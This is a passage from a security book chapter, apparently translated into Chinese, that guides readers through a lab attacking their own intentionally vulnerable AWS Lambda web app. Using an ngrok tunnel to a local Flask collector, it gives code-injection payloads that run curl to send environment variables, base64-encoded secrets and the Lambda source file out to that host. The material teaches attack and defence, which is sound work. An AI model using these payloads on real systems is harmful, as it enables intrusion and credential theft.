

```
ngrok                                                                                                                                                                                      (Ctrl+C to quit)

all internal services from your gateway: ...

Session Status          online
Account                 ... (Plan: Free)
Version                 3.23.3
Region                  Asia Pacific (ap)
Latency                 47ms
Web Interface           http://127.0.0.1:4040
Forwarding              https://<ID>.ngrok-free.app -> http://localhost:8000

Connections             ttl     opn     rt1     rt5     p50     p90
                        0       0       0.00    0.00    0.00    0.00
```

这里，`ngrok` 从一个公共 URL 创建到本地 Flask 服务器的安全隧道，将所有传入请求转发到端口 `8000`。^([13](#ch06.html#id690))

### Note

请务必从 Forwarding 部分复制 HTTPS 转发 URL，例如 `https://<ID>.ngrok-free.app`。在后续步骤中你需要它来接收 HTTP 请求到本地。

此时，你应该在本地机器上同时运行 Flask 服务器和 `ngrok` 隧道。有了这个设置，任何发送到 `ngrok` HTTPS 转发 URL 的请求都会通过隧道安全地转发到端口 `8000` 上的 Flask 服务器。例如，如果包含环境变量的请求发送到 `ngrok` HTTPS 转发 URL，你应该会在 Flask 服务器日志中看到这些环境变量。

请记住，此设置旨在帮助你理解代码注入攻击后捕获和分析被窃取数据的过程。攻击者在真实攻击中通常会使用更复杂的工具和专用基础设施，以及更隐蔽的数据外泄技术。

## Attacking the Vulnerable Serverless Web Application

在前面的章节中，你在 Lambda 代码中引入了一个部分有效的防御控制，并配置了一个攻击者控制的服务器来捕获被窃取的数据。在本节中，你将再次模拟攻击过程，并重点关注攻击者如何利用出站连接将敏感数据外泄到外部服务器。

一切准备就绪，让我们继续模拟：

1. 切回浏览器标签页，其中 S3 托管的网站已打开。

   ### Tip

   如果你不小心关闭了浏览器标签页，可以通过在新标签页中导航到 `http://BUCKET_NAME.s3-website-REGION.amazonaws.com` 来重新打开你的 S3 托管静态网站。记得用你设置中的实际值替换 `BUCKET_NAME` 和 `REGION`。你也可以通过 AWS 管理控制台检索存储桶网站端点，方法是转到 S3 存储桶的 Properties 选项卡，并在“静态网站托管”下查看“存储桶网站端点”。

2. 输入并评估以下表达式以将你的环境变量发送到暴露的 Flask 服务器：

   ```
   __import__('os').system('curl -X POST -d \"$(env)\" https://[GENERATED ID].ngrok-free.app')
   ```

   ### Note

   请确保将 `[GENERATED ID]` 替换为 HTTPS 转发 URL 的 `<ID>` 值。

3. 通过在新浏览器标签页中访问 *http​://127.0.0.1:4040* 打开本地 `ngrok` Web 界面 ([Figure 6-7](#ch06.html#fig0607))。

   在这里，你可以检查通过 `ngrok` 隧道接收的 HTTP 请求，并从发送到 Flask Web 服务器的环境变量中提取凭据。

   ### Note

   你也可以通过检查 Flask 服务器的终端输出来检查环境变量。

   ![](assets/lsse_0607.png)

4. 切回浏览器标签页，其中 S3 托管的网站已打开，然后评估以下表达式以将你的 Base64 编码环境变量发送到暴露的 Flask 服务器：

   ```
   __import__('os').system('env | base64 | curl -X POST --data-binary @- https://[GENERATED ID].ngrok-free.app')
   ```

   这里，`@-` 是一个 `curl` 参数，表示“从 stdin 读取请求体”。`@-` 和 `https` 之间必须有一个空格，即 `--data-binary @- https://...`，以便数据源参数和目标 URL 是独立的 shell 参数。如果没有那个空格，URL 将成为同一 token 的一部分，命令将不会按预期运行。

   ### Tip

   你可以通过在单独的终端窗口中运行以下命令来解码 Base64 编码的字符串：`echo "<BASE64 ENCODED STRING>" | base64 -d`。

5. 评估以下表达式以将 Lambda 函数的源代码外泄到你的 Flask 服务器：

   ```
   __import__('os').system('curl -X POST --data-binary @/var/task/lambda_function.py https://[GENERATED ID].ngrok-free.app')
   ```

   此 shell 命令使用 `curl` 通过 `POST` 请求将已部署 Lambda 函数源代码文件 (`/var/task/lambda_function.py`) 的原始内容发送到外部 HTTP 端点。

   你应该得到以下 Flask 服务器输出：

   ```
   -------------------------------------------------------
   BODY
   -------------------------------------------------------
   import re
   
   from os import environ
   get_env = environ.get
   
   HARDCODED_KEY_01 = "ABCDE"
   HARDCODED_KEY_02 = "FGHIJ"
   
   
   def get_statement(event):
       params = event.get('queryStringParameters', {})
       statement = params.get('statement', None)
   
       return statement
   
   ...
   ```

看起来你的 Lambda 函数仍然容易受到代码注入攻击！你可能会想通过将环境变量中的密钥转移到 Secrets Manager 来解决这个问题。然而，正如你在下一节中将看到的，仅仅将密钥存储在 Secrets Manager 中并不能完全解决问题的根本原因。同时，它也无法阻止攻击者执行任意代码并可能外泄数据。

# Stealing Secrets Manager Secrets Through a Vulnerable Lambda Function

你经常听说使用密钥管理器服务存储密钥可以确保凭据得到安全存储和轮换。虽然这是真的，但它并不是万能的，因为攻击者仍可能通过利用 Lambda 函数中的漏洞或函数相关 IAM 角色的错误配置来获取密钥。

在本节中，你将更新你的有意易受攻击的无服务器 Web 应用程序以使用 AWS Secrets Manager 作为主要的密钥存储。你将修改 Lambda 函数代码使其从 Secrets Manager 检索密钥，并相应地更新函数的角色权限。你随后将模拟通过代码注入漏洞窃取 Secrets Manager 密钥的攻击，如 [Figure 6-8](#ch06.html#lab-setup-secrets-manager) 所示。

![](assets/lsse_0608.png)

为了帮助你理解这些风险如何被利用和缓解，本节分为四个部分：

*   [“Storing Secrets in AWS Secrets Manager”](#ch06.html#storing_secrets_in_aws_secrets_manager_ch06-hacking-publicly-accessible-lambda-functions_1762888893800)

*   [“Updating the Lambda Function Role Permissions for Accessing Secrets Manager”](#ch06.html#updating_the_lambda_function_role_permissions_for_accessing_secrets_manager_ch06-hacking-publicly-accessible-lambda-functions_1762888919942)

*   [“Updating the Lambda Function Code to Retrieve Secrets from Secrets Manager”](#ch06.html#updating_the_lambda_function_code_to_retrieve_secrets_from_secrets_manager_ch06-hacking-publicly-accessible-lambda-functions_1762888906925)

*   [“Stealing Secrets Manager Secrets Through a Code Injection Attack”](#ch06.html#stealing_secrets_manager_secrets_through_a_code_injection_attack_ch06-hacking-publicly-accessible-lambda-functions_1762888937007)

